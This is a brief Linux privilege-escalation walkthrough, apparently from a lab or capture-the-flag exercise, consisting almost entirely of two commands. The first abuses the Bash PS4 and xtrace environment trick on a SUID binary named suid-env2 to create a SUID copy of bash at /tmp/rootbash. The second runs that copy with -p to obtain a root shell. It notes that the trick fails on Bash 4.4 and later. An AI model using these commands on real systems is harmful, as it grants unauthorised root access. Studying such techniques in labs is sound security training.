**Note:** This will not work on Bash versions 4.4 and above.
1. Run the debugging mode
```console
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
2. Run the new service just made by
```console
/tmp/rootbash -p
```
